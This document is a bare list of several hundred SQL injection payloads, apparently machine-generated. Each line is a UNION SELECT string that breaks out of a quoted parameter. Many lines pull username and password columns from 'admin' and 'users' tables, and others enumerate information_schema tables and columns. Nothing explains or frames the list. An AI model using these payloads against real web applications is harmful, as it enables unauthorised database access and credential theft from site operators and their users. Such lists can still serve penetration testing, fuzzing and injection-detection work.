1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT id ,password ,password ,username FROM admin WHERE id <>'
1' UNION SELECT NULL ,price ,type ,id FROM products WHERE id <>'
1' UNION SELECT CREATE_OPTIONS ,AVG_ROW_LENGTH ,AVG_ROW_LENGTH ,ENGINE FROM information_schema.tables WHERE INDEX_LENGTH ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM admin WHERE id <>'
1' UNION SELECT MAX_DATA_LENGTH ,TABLE_NAME ,NULL ,TABLE_NAME FROM information_schema.tables WHERE VERSION ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,password ,id ,id FROM admin WHERE password <>'
1' UNION SELECT NULL ,username ,password ,password FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,id ,username FROM users WHERE id ='1
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT COLUMN_COMMENT ,GENERATION_EXPRESSION ,COLUMN_NAME ,PRIVILEGES FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT name ,id ,description ,name FROM types WHERE name ='1
1' UNION SELECT comment ,comment ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT id ,id ,NULL ,NULL FROM users WHERE id ='1
1' UNION SELECT id ,NULL ,password ,NULL FROM admin WHERE password ='1
1' UNION SELECT DATA_TYPE ,TABLE_NAME ,TABLE_NAME ,TABLE_CATALOG FROM information_schema.columns WHERE EXTRA <>'
1' UNION SELECT COLUMN_COMMENT ,NUMERIC_SCALE ,CHARACTER_OCTET_LENGTH ,NUMERIC_SCALE FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,description ,id ,name FROM types WHERE id <>'
1' UNION SELECT AVG_ROW_LENGTH ,ENGINE ,DATA_LENGTH ,ENGINE FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT TABLE_ROWS ,TABLE_CATALOG ,TABLE_ROWS ,TABLE_NAME FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT NULL ,id ,price ,price FROM products WHERE type <>'
1' UNION SELECT NULL ,id ,NULL ,name FROM types WHERE id <>'
1' UNION SELECT username ,id ,password ,password FROM users WHERE id ='1
1' UNION SELECT NULL ,comment ,comment ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT name ,type ,type ,price FROM products WHERE type <>'
1' UNION SELECT name ,id ,description ,id FROM types WHERE name ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,name ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT TABLE_COLLATION ,DATA_LENGTH ,TABLE_NAME ,TABLE_COLLATION FROM information_schema.tables WHERE AVG_ROW_LENGTH ='1
1' UNION SELECT NULL ,id ,id ,name FROM types WHERE id <>'
1' UNION SELECT id ,description ,id ,id FROM types WHERE id ='1
1' UNION SELECT description ,NULL ,NULL ,NULL FROM types WHERE id ='1
1' UNION SELECT NULL ,name ,name ,id FROM types WHERE description ='1
1' UNION SELECT GENERATION_EXPRESSION ,DATETIME_PRECISION ,NUMERIC_SCALE ,CHARACTER_SET_NAME FROM information_schema.columns WHERE NUMERIC_PRECISION ='1
1' UNION SELECT NULL ,username ,NULL ,id FROM admin WHERE username ='1
1' UNION SELECT NULL ,name ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT name ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,name ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT password ,password ,NULL ,password FROM admin WHERE id <>'
1' UNION SELECT NULL ,name ,description ,description FROM types WHERE description <>'
1' UNION SELECT NULL ,id ,id ,NULL FROM users WHERE id ='1
1' UNION SELECT name ,NULL ,name ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,price ,type ,NULL FROM products WHERE price <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,NULL ,NULL ,name FROM commentsnew WHERE name <>'
1' UNION SELECT id ,NULL ,NULL ,id FROM products WHERE type <>'
1' UNION SELECT username ,username ,id ,NULL FROM admin WHERE id <>'
1' UNION SELECT id ,id ,price ,name FROM products WHERE type <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT username ,id ,NULL ,password FROM admin WHERE username ='1
1' UNION SELECT username ,password ,id ,NULL FROM admin WHERE password ='1
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT description ,name ,description ,NULL FROM types WHERE name ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT id ,username ,password ,password FROM users WHERE username ='1
1' UNION SELECT TABLE_NAME ,COLUMN_TYPE ,COLUMN_TYPE ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,CREATE_TIME ,AVG_ROW_LENGTH ,TABLE_ROWS FROM information_schema.tables WHERE DATA_LENGTH <>'
1' UNION SELECT id ,id ,username ,NULL FROM admin WHERE id ='1
1' UNION SELECT COLUMN_COMMENT ,TABLE_SCHEMA ,COLUMN_TYPE ,IS_NULLABLE FROM information_schema.columns WHERE COLLATION_NAME ='1
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,id ,password ,NULL FROM admin WHERE id ='1
1' UNION SELECT id ,id ,id ,name FROM types WHERE id ='1
1' UNION SELECT comment ,comment ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT description ,name ,name ,name FROM types WHERE name <>'
1' UNION SELECT password ,username ,username ,username FROM users WHERE username ='1
1' UNION SELECT TABLE_COLLATION ,TABLE_ROWS ,TABLE_NAME ,TABLE_NAME FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT id ,username ,id ,id FROM users WHERE username ='1
1' UNION SELECT COLUMN_DEFAULT ,IS_NULLABLE ,IS_NULLABLE ,NUMERIC_SCALE FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT NUMERIC_PRECISION ,COLUMN_KEY ,COLUMN_TYPE ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE TABLE_SCHEMA ='1
1' UNION SELECT name ,id ,description ,name FROM types WHERE name <>'
1' UNION SELECT username ,username ,id ,id FROM users WHERE id <>'
1' UNION SELECT password ,NULL ,NULL ,id FROM admin WHERE id ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,username ,password FROM admin WHERE id ='1
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT COLLATION_NAME ,TABLE_CATALOG ,IS_NULLABLE ,COLUMN_TYPE FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT name ,price ,id ,price FROM products WHERE name ='1
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,NULL ,price ,NULL FROM products WHERE id ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT name ,name ,NULL ,NULL FROM products WHERE price <>'
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT username ,username ,NULL ,password FROM users WHERE password <>'
1' UNION SELECT password ,password ,username ,password FROM users WHERE username <>'
1' UNION SELECT username ,id ,id ,password FROM users WHERE username ='1
1' UNION SELECT name ,comment ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT name ,id ,NULL ,NULL FROM types WHERE id <>'
1' UNION SELECT password ,password ,username ,username FROM users WHERE id ='1
1' UNION SELECT EXTRA ,ORDINAL_POSITION ,TABLE_SCHEMA ,EXTRA FROM information_schema.columns WHERE TABLE_SCHEMA ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT COLUMN_KEY ,DATA_TYPE ,EXTRA ,DATETIME_PRECISION FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT NULL ,description ,description ,id FROM types WHERE name ='1
1' UNION SELECT COLUMN_KEY ,TABLE_SCHEMA ,COLUMN_TYPE ,TABLE_NAME FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT name ,NULL ,NULL ,id FROM types WHERE description ='1
1' UNION SELECT DATA_FREE ,AUTO_INCREMENT ,CHECK_TIME ,NULL FROM information_schema.tables WHERE TABLE_TYPE <>'
1' UNION SELECT NULL ,NULL ,type ,NULL FROM products WHERE name ='1
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT description ,name ,name ,id FROM types WHERE description ='1
1' UNION SELECT GENERATION_EXPRESSION ,SRS_ID ,TABLE_CATALOG ,CHARACTER_SET_NAME FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,CHARACTER_MAXIMUM_LENGTH ,DATA_TYPE ,COLUMN_DEFAULT FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,password ,password ,password FROM admin WHERE password <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,id ,id ,username FROM users WHERE username <>'
1' UNION SELECT price ,NULL ,type ,type FROM products WHERE name <>'
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT password ,username ,username ,id FROM admin WHERE username <>'
1' UNION SELECT NULL ,comment ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT username ,id ,NULL ,NULL FROM admin WHERE password <>'
1' UNION SELECT id ,id ,id ,NULL FROM types WHERE id ='1
1' UNION SELECT COLUMN_NAME ,NULL ,COLUMN_TYPE ,COLUMN_COMMENT FROM information_schema.columns WHERE SRS_ID <>'
1' UNION SELECT id ,username ,username ,password FROM users WHERE id <>'
1' UNION SELECT name ,description ,name ,description FROM types WHERE name ='1
1' UNION SELECT MAX_DATA_LENGTH ,TABLE_ROWS ,DATA_LENGTH ,AVG_ROW_LENGTH FROM information_schema.tables WHERE TABLE_CATALOG ='1
1' UNION SELECT id ,NULL ,description ,name FROM types WHERE name <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,price ,price ,type FROM products WHERE name ='1
1' UNION SELECT name ,name ,NULL ,NULL FROM products WHERE id <>'
1' UNION SELECT NULL ,id ,username ,username FROM users WHERE id ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT TABLE_COMMENT ,MAX_DATA_LENGTH ,TABLE_SCHEMA ,TABLE_CATALOG FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT username ,id ,NULL ,username FROM users WHERE id <>'
1' UNION SELECT NULL ,AUTO_INCREMENT ,DATA_FREE ,VERSION FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,name ,id ,description FROM types WHERE id <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NUMERIC_PRECISION ,TABLE_SCHEMA ,TABLE_NAME ,ORDINAL_POSITION FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT name ,name ,comment ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,username ,id ,password FROM admin WHERE username <>'
1' UNION SELECT comment ,comment ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT password ,id ,id ,NULL FROM users WHERE username <>'
1' UNION SELECT UPDATE_TIME ,ENGINE ,MAX_DATA_LENGTH ,INDEX_LENGTH FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT COLLATION_NAME ,DATETIME_PRECISION ,SRS_ID ,COLUMN_NAME FROM information_schema.columns WHERE NUMERIC_PRECISION <>'
1' UNION SELECT NULL ,name ,name ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,name ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,password ,id ,password FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM types WHERE description <>'
1' UNION SELECT password ,id ,NULL ,id FROM users WHERE username <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,NULL ,NULL ,id FROM types WHERE name <>'
1' UNION SELECT SRS_ID ,IS_NULLABLE ,CHARACTER_SET_NAME ,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT password ,password ,password ,password FROM users WHERE password ='1
1' UNION SELECT id ,type ,type ,id FROM products WHERE id <>'
1' UNION SELECT id ,id ,password ,username FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,password ,NULL FROM users WHERE id <>'
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT SRS_ID ,COLUMN_KEY ,CHARACTER_SET_NAME ,GENERATION_EXPRESSION FROM information_schema.columns WHERE TABLE_SCHEMA ='1
1' UNION SELECT NULL ,password ,id ,password FROM admin WHERE username <>'
1' UNION SELECT TABLE_CATALOG ,COLLATION_NAME ,GENERATION_EXPRESSION ,CHARACTER_SET_NAME FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH <>'
1' UNION SELECT SRS_ID ,CHARACTER_MAXIMUM_LENGTH ,DATA_TYPE ,TABLE_NAME FROM information_schema.columns WHERE GENERATION_EXPRESSION <>'
1' UNION SELECT name ,name ,description ,NULL FROM types WHERE description <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,username ,password ,NULL FROM users WHERE password <>'
1' UNION SELECT id ,id ,NULL ,password FROM users WHERE username <>'
1' UNION SELECT username ,id ,password ,username FROM users WHERE username ='1
1' UNION SELECT password ,id ,password ,NULL FROM users WHERE id ='1
1' UNION SELECT name ,comment ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,name ,description ,name FROM types WHERE name <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT price ,price ,name ,type FROM products WHERE name ='1
1' UNION SELECT username ,NULL ,NULL ,username FROM users WHERE id <>'
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT description ,description ,id ,description FROM types WHERE name <>'
1' UNION SELECT password ,NULL ,NULL ,id FROM admin WHERE username <>'
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT name ,comment ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT username ,NULL ,id ,password FROM users WHERE username ='1
1' UNION SELECT NULL ,comment ,comment ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,price ,id ,price FROM products WHERE type ='1
1' UNION SELECT name ,NULL ,comment ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT type ,NULL ,type ,price FROM products WHERE name ='1
1' UNION SELECT CHECK_TIME ,CHECK_TIME ,ENGINE ,NULL FROM information_schema.tables WHERE TABLE_SCHEMA <>'
1' UNION SELECT name ,NULL ,NULL ,id FROM types WHERE name <>'
1' UNION SELECT description ,id ,name ,name FROM types WHERE description <>'
1' UNION SELECT id ,name ,description ,NULL FROM types WHERE description <>'
1' UNION SELECT NULL ,id ,description ,id FROM types WHERE description ='1
1' UNION SELECT name ,comment ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT name ,name ,name ,id FROM types WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT password ,id ,id ,NULL FROM admin WHERE username <>'
1' UNION SELECT NULL ,password ,id ,username FROM users WHERE password <>'
1' UNION SELECT type ,name ,NULL ,price FROM products WHERE name <>'
1' UNION SELECT UPDATE_TIME ,UPDATE_TIME ,CREATE_TIME ,MAX_DATA_LENGTH FROM information_schema.tables WHERE TABLE_COMMENT ='1
1' UNION SELECT GENERATION_EXPRESSION ,CHARACTER_SET_NAME ,NUMERIC_PRECISION ,NULL FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT password ,NULL ,password ,username FROM admin WHERE password ='1
1' UNION SELECT password ,username ,password ,id FROM admin WHERE username ='1
1' UNION SELECT name ,id ,name ,description FROM types WHERE name ='1
1' UNION SELECT price ,NULL ,name ,id FROM products WHERE price <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT id ,NULL ,username ,username FROM admin WHERE username ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT price ,id ,type ,type FROM products WHERE name ='1
1' UNION SELECT id ,NULL ,NULL ,NULL FROM types WHERE name <>'
1' UNION SELECT id ,name ,id ,price FROM products WHERE id ='1
1' UNION SELECT price ,type ,NULL ,id FROM products WHERE price ='1
1' UNION SELECT comment ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,password ,id ,NULL FROM admin WHERE id ='1
1' UNION SELECT COLUMN_DEFAULT ,COLLATION_NAME ,PRIVILEGES ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_DEFAULT ='1
1' UNION SELECT id ,NULL ,name ,name FROM products WHERE name ='1
1' UNION SELECT NULL ,id ,description ,name FROM types WHERE description ='1
1' UNION SELECT name ,comment ,NULL ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT NUMERIC_PRECISION ,COLUMN_COMMENT ,COLUMN_DEFAULT ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE COLLATION_NAME ='1
1' UNION SELECT NULL ,name ,id ,NULL FROM types WHERE name <>'
1' UNION SELECT NUMERIC_PRECISION ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_COMMENT ,GENERATION_EXPRESSION FROM information_schema.columns WHERE EXTRA ='1
1' UNION SELECT description ,name ,NULL ,NULL FROM types WHERE description <>'
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT ROW_FORMAT ,AUTO_INCREMENT ,TABLE_TYPE ,AUTO_INCREMENT FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT name ,NULL ,name ,id FROM types WHERE name ='1
1' UNION SELECT DATA_LENGTH ,TABLE_TYPE ,DATA_LENGTH ,CHECKSUM FROM information_schema.tables WHERE DATA_LENGTH ='1
1' UNION SELECT id ,password ,password ,username FROM admin WHERE id ='1
1' UNION SELECT username ,password ,password ,id FROM users WHERE username ='1
1' UNION SELECT id ,id ,NULL ,name FROM products WHERE price ='1
1' UNION SELECT NULL ,username ,password ,id FROM admin WHERE password ='1
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT comment ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,price ,id FROM products WHERE id <>'
1' UNION SELECT password ,password ,username ,username FROM admin WHERE username ='1
1' UNION SELECT username ,NULL ,NULL ,password FROM users WHERE id <>'
1' UNION SELECT IS_NULLABLE ,NUMERIC_SCALE ,TABLE_SCHEMA ,TABLE_NAME FROM information_schema.columns WHERE NUMERIC_PRECISION ='1
